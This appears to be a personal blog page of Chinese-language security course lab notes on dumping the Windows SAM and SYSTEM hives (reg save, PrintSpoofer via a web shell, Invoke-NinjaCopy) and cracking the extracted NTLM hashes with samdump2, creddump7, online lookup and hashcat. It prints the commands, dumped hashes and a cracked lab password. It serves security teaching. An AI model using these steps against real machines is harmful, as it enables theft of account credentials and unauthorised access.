<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  NTUSTISC - AD Note - Lab(Brute Force SAM)
  #

[TOC]
Lecture Video: 2022/05/04 AD 安全1

  Background
  #

得到更高權限之後，會想要更多的密碼

密碼收集

SAM.hive(Security Account Manager)

What: 就是一個用於windows的數據庫文件，用於==儲存用戶的密碼==，並且對於本地端或遠端的使用者進行身分認證
Where: C:\Windows\System32\config\SAM


Password Spraying(用猜的)
GPO
記憶體(lsass)




  Lab
  #


  ==Brute Force SAM==
  #

前面有提到SAM在哪裡，所以只要直接打開就看的到密碼了嗎?你會得到一個access denied的錯誤，原因是他已經被設定成read lock了，導致目前無法正常存取


匯出SAM File
主要目的就是把SAM file和SYSTEM file dump下來，而方法就是利用reg.exe(Windows註冊碼工具)，用指令的方式存取
$ reg save HKLM\SAM <save filename>
$ reg save HKLM\SYSTEM <save filename>

錯誤的方式
但經過cmd用普通權限實測會發現我們沒有這樣的資格
$ reg save HKLM\SAM SAM.dump
錯誤: 用戶端沒有這項特殊權限。
其實也很合理，不然所有人都可以直接存取意味著只要摸到其中一臺普通權限的AD，所有機敏資料都會外洩，這就是為甚麼前面需要提權的原因，只有最高權限的帳戶可以存取這兩個file
正確的方式-1
用前面提到的web shell，打出以下指令，則SAM file就會dump到C:\inetpub\wwwroot\sam.zip
$ c:\tools\PrintSpoofer64.exe -c "reg save HKLM\SAM C:\inetpub\wwwroot\sam"

正確的方式-2
利用Invoke-NinjaCopy.ps1這個腳本，就可以複製出來，原理是使用windows的影子複製
$ .\Invoke-NinjaCopy -Path SAM -LocalDestination C:\tools\SAM_COPY
但是經過實測，發現執行雖然有成功但是沒有任何檔案被dump出來，可能中間有些過程有誤?
:::info
如果要用這個方法，PowerShell要以管理員權限打開，然後如果有遇到如下error message，可以參考這邊1解決問題
.\Invoke-NinjaCopy : 因為這個系統上已停用指令碼執行，所以無法載入 C:\tools\Invoke-NinjaCopy.ps1 檔案。如需詳細資訊，請參閱 about_Execution_Policies，網址為 https:/go.microsoft.com/fwlink/?LinkID=135170。
位於 線路:1 字元:1
+ .\Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestina ...
+ ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess
:::


解析SAM內容
拿到SAM的內容之後還需要解析他，可以用kali的samdump2解析

Win10 v1607之前的解法
$ samdump2 system sam 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

可以看到很多都是disabled，就代表我們要用下面的解法
Win10 v1607之後
因為這個版本之後有用到AES加密，所以可以用Creddump7，建議使用anaconda這樣的虛擬環境，不然直接用內建的virtualenv會出事，
$ conda activate py2.7
$ pip install pycrypto
$ git clone https://github.com/CiscoCXSecurity/creddump7.git
$ python pwdump.py system sam
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ecffff0c3548187607a14bad0f88bb1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e3180c5331aad6ad1ac787749e6c4819:::
user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
low:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::



解析Hash

方法一：用online database
接著就是把NTLM Hash丟到隨便的database看有沒有紀錄，例如cmd5，如果把最前面找到的31d6cfe0d16ae931b73c59d7e0c089c0會顯示空密碼，但我們都知道是錯的

而如果拿Creddump解析出來的7ecffff0c3548187607a14bad0f88bb1，就可以直接顯示出我們的密碼

方法二：爆字典檔
在kali中的/usr/share/wordlists有一些字典檔可以用，例如rockyou等等，可以先用看看
$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
$ cp /usr/share/wordlists/rockyou.txt ./
$ hashcat -a 0 -m 1000 ntlm.hash rockyou.txt --force
...
31d6cfe0d16ae931b73c59d7e0c089c0:                         
7ecffff0c3548187607a14bad0f88bb1:1qaz@WSX3edc
...





  Reference
  #





PowerShell 「系統上已停用指令碼執行」解決方法&#160;&#8617;&#xfe0e;'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="NTUSTISC - AD Note - Lab(Brute Force SAM)"><meta property="og:description" content='NTUSTISC - AD Note - Lab(Brute Force SAM) # [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background # 得到更高權限之後，會想要更多的密碼
密碼收集 SAM.hive(Security Account Manager) What: 就是一個用於windows的數據庫文件，用於==儲存用戶的密碼==，並且對於本地端或遠端的使用者進行身分認證 Where: C:\Windows\System32\config\SAM Password Spraying(用猜的) GPO 記憶體(lsass) Lab # ==Brute Force SAM== # 前面有提到SAM在哪裡，所以只要直接打開就看的到密碼了嗎?你會得到一個access denied的錯誤，原因是他已經被設定成read lock了，導致目前無法正常存取 匯出SAM File 主要目的就是把SAM file和SYSTEM file dump下來，而方法就是利用reg.exe(Windows註冊碼工具)，用指令的方式存取 $ reg save HKLM\SAM <save filename> $ reg save HKLM\SYSTEM <save filename> 錯誤的方式 但經過cmd用普通權限實測會發現我們沒有這樣的資格 $ reg save HKLM\SAM SAM.dump 錯誤: 用戶端沒有這項特殊權限。 其實也很合理，不然所有人都可以直接存取意味著只要摸到其中一臺普通權限的AD，所有機敏資料都會外洩，這就是為甚麼前面需要提權的原因，只有最高權限的帳戶可以存取這兩個file 正確的方式-1 用前面提到的web shell，打出以下指令，則SAM file就會dump到C:\inetpub\wwwroot\sam.zip $ c:\tools\PrintSpoofer64.exe -c "reg save HKLM\SAM C:\inetpub\wwwroot\sam" 正確的方式-2 利用Invoke-NinjaCopy.ps1這個腳本，就可以複製出來，原理是使用windows的影子複製 $ .\Invoke-NinjaCopy -Path SAM -LocalDestination C:\tools\SAM_COPY 但是經過實測，發現執行雖然有成功但是沒有任何檔案被dump出來，可能中間有些過程有誤? :::info 如果要用這個方法，PowerShell要以管理員權限打開，然後如果有遇到如下error message，可以參考這邊1解決問題 .\Invoke-NinjaCopy : 因為這個系統上已停用指令碼執行，所以無法載入 C:\tools\Invoke-NinjaCopy.ps1 檔案。如需詳細資訊，請參閱 about_Execution_Policies，網址為 https:/go.microsoft.com/fwlink/?LinkID=135170。 位於 線路:1 字元:1 + .\Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestina ... + ~~~~~~~~~~~~~~~~~~ + CategoryInfo : SecurityError: (:) [], PSSecurityException + FullyQualifiedErrorId : UnauthorizedAccess ::: 解析SAM內容 拿到SAM的內容之後還需要解析他，可以用kali的samdump2解析 Win10 v1607之前的解法 $ samdump2 system sam Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: *disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: *disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: :1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 可以看到很多都是disabled，就代表我們要用下面的解法 Win10 v1607之後 因為這個版本之後有用到AES加密，所以可以用Creddump7，建議使用anaconda這樣的虛擬環境，不然直接用內建的virtualenv會出事， $ conda activate py2.7 $ pip install pycrypto $ git clone https://github.com/CiscoCXSecurity/creddump7.git $ python pwdump.py system sam Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ecffff0c3548187607a14bad0f88bb1::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e3180c5331aad6ad1ac787749e6c4819::: user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: low:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 解析Hash 方法一：用online database 接著就是把NTLM Hash丟到隨便的database看有沒有紀錄，例如cmd5，如果把最前面找到的31d6cfe0d16ae931b73c59d7e0c089c0會顯示空密碼，但我們都知道是錯的 而如果拿Creddump解析出來的7ecffff0c3548187607a14bad0f88bb1，就可以直接顯示出我們的密碼 方法二：爆字典檔 在kali中的/usr/share/wordlists有一些字典檔可以用，例如rockyou等等，可以先用看看 $ sudo gunzip /usr/share/wordlists/rockyou.txt.gz $ cp /usr/share/wordlists/rockyou.txt ./ $ hashcat -a 0 -m 1000 ntlm.hash rockyou.txt --force ... 31d6cfe0d16ae931b73c59d7e0c089c0: 7ecffff0c3548187607a14bad0f88bb1:1qaz@WSX3edc ... Reference # PowerShell 「系統上已停用指令碼執行」解決方法 ↩︎'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="NTUSTISC"><meta property="article:tag" content="AD"><meta property="article:tag" content="Information Security"><title>NTUSTISC - AD Note - Lab(Brute Force SAM) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>NTUSTISC - AD Note - Lab(Brute Force SAM)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#lab>Lab</a><ul><li><a href=#brute-force-sam>==Brute Force SAM==</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=ntustisc---ad-note---labbrute-force-sam>NTUSTISC - AD Note - Lab(Brute Force SAM)
<a class=anchor href=#ntustisc---ad-note---labbrute-force-sam>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;t=4257">2022/05/04 AD 安全1</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>得到更高權限之後，會想要更多的密碼</p><ul><li>密碼收集<ul><li>SAM.hive(Security Account Manager)<ul><li>What: 就是一個用於windows的數據庫文件，用於==儲存用戶的密碼==，並且對於本地端或遠端的使用者進行身分認證</li><li>Where: <code>C:\Windows\System32\config\SAM</code></li></ul></li><li>Password Spraying(用猜的)</li><li>GPO</li><li>記憶體(lsass)</li></ul></li></ul><h2 id=lab>Lab
<a class=anchor href=#lab>#</a></h2><h3 id=brute-force-sam>==Brute Force SAM==
<a class=anchor href=#brute-force-sam>#</a></h3><p>前面有提到SAM在哪裡，所以只要直接打開就看的到密碼了嗎?你會得到一個access denied的錯誤，原因是他已經被設定成read lock了，導致目前無法正常存取
<img src=https://hackmd.io/_uploads/SyEUVnMRn.png alt></p><ol><li>匯出SAM File
主要目的就是把SAM file和SYSTEM file dump下來，而方法就是利用reg.exe(Windows註冊碼工具)，用指令的方式存取<pre tabindex=0><code class=language-bash! data-lang=bash!>$ reg save HKLM\SAM &lt;save filename&gt;
$ reg save HKLM\SYSTEM &lt;save filename&gt;
</code></pre><ul><li>錯誤的方式
但經過cmd用普通權限實測會發現我們沒有這樣的資格<pre tabindex=0><code class=language-bash! data-lang=bash!>$ reg save HKLM\SAM SAM.dump
錯誤: 用戶端沒有這項特殊權限。
</code></pre>其實也很合理，不然所有人都可以直接存取意味著只要摸到其中一臺普通權限的AD，所有機敏資料都會外洩，這就是為甚麼前面需要提權的原因，只有最高權限的帳戶可以存取這兩個file</li><li>正確的方式-1
用前面提到的web shell，打出以下指令，則SAM file就會dump到<code>C:\inetpub\wwwroot\sam.zip</code><pre tabindex=0><code class=language-bash! data-lang=bash!>$ c:\tools\PrintSpoofer64.exe -c &#34;reg save HKLM\SAM C:\inetpub\wwwroot\sam&#34;
</code></pre></li><li>正確的方式-2
利用<a href=https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1>Invoke-NinjaCopy.ps1</a>這個腳本，就可以複製出來，原理是使用windows的影子複製<pre tabindex=0><code class=language-bash! data-lang=bash!>$ .\Invoke-NinjaCopy -Path SAM -LocalDestination C:\tools\SAM_COPY
</code></pre>但是經過實測，發現執行雖然有成功但是沒有任何檔案被dump出來，可能中間有些過程有誤?
:::info
如果要用這個方法，PowerShell要以管理員權限打開，然後如果有遇到如下error message，可以參考這邊<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>解決問題<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>.<span style=color:#ae81ff>\I</span>nvoke-NinjaCopy : 因為這個系統上已停用指令碼執行，所以無法載入 C:<span style=color:#ae81ff>\t</span>ools<span style=color:#ae81ff>\I</span>nvoke-NinjaCopy.ps1 檔案。如需詳細資訊，請參閱 about_Execution_Policies，網址為 https:/go.microsoft.com/fwlink/?LinkID<span style=color:#f92672>=</span>135170。
</span></span><span style=display:flex><span>位於 線路:1 字元:1
</span></span><span style=display:flex><span>+ .<span style=color:#ae81ff>\I</span>nvoke-NinjaCopy -Path C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>onfig<span style=color:#ae81ff>\S</span>AM -LocalDestina ...
</span></span><span style=display:flex><span>+ ~~~~~~~~~~~~~~~~~~
</span></span><span style=display:flex><span>    + CategoryInfo          : SecurityError: <span style=color:#f92672>(</span>:<span style=color:#f92672>)</span> <span style=color:#f92672>[]</span>, PSSecurityException
</span></span><span style=display:flex><span>    + FullyQualifiedErrorId : UnauthorizedAccess
</span></span></code></pre></div>:::</li></ul></li><li>解析SAM內容
拿到SAM的內容之後還需要解析他，可以用kali的samdump2解析<ul><li>Win10 v1607之前的解法<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ samdump2 system sam 
</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span></code></pre></div><img src=https://hackmd.io/_uploads/HyJXHazCn.png alt>
可以看到很多都是disabled，就代表我們要用下面的解法</li><li>Win10 v1607之後
因為這個版本之後有用到AES加密，所以可以用<a href=https://github.com/CiscoCXSecurity/creddump7>Creddump7</a>，建議使用anaconda這樣的虛擬環境，不然直接用內建的virtualenv會出事，<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ conda activate py2.7
</span></span><span style=display:flex><span>$ pip install pycrypto
</span></span><span style=display:flex><span>$ git clone https://github.com/CiscoCXSecurity/creddump7.git
</span></span><span style=display:flex><span>$ python pwdump.py system sam
</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ecffff0c3548187607a14bad0f88bb1:::
</span></span><span style=display:flex><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e3180c5331aad6ad1ac787749e6c4819:::
</span></span><span style=display:flex><span>user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>low:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span></code></pre></div></li></ul></li><li>解析Hash<ul><li>方法一：用online database
接著就是把NTLM Hash丟到隨便的database看有沒有紀錄，例如<a href=https://www.cmd5.com/>cmd5</a>，如果把最前面找到的<code>31d6cfe0d16ae931b73c59d7e0c089c0</code>會顯示空密碼，但我們都知道是錯的
<img src=https://hackmd.io/_uploads/SkKrp6zCn.png alt>
而如果拿Creddump解析出來的<code>7ecffff0c3548187607a14bad0f88bb1</code>，就可以直接顯示出我們的密碼
<img src=https://hackmd.io/_uploads/H1ZAhpz02.png alt></li><li>方法二：爆字典檔
在kali中的/usr/share/wordlists有一些字典檔可以用，例如rockyou等等，可以先用看看<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
</span></span><span style=display:flex><span>$ cp /usr/share/wordlists/rockyou.txt ./
</span></span><span style=display:flex><span>$ hashcat -a <span style=color:#ae81ff>0</span> -m <span style=color:#ae81ff>1000</span> ntlm.hash rockyou.txt --force
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>31d6cfe0d16ae931b73c59d7e0c089c0:                         
</span></span><span style=display:flex><span>7ecffff0c3548187607a14bad0f88bb1:1qaz@WSX3edc
</span></span><span style=display:flex><span>...
</span></span></code></pre></div></li></ul></li></ol><h1 id=reference>Reference
<a class=anchor href=#reference>#</a></h1><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://hackercat.org/windows/powershell-cannot-be-loaded-because-the-execution-of-scripts-is-disabled-on-this-system>PowerShell 「系統上已停用指令碼執行」解決方法</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#lab>Lab</a><ul><li><a href=#brute-force-sam>==Brute Force SAM==</a></li></ul></li></ul></nav></div></aside></main></body></html>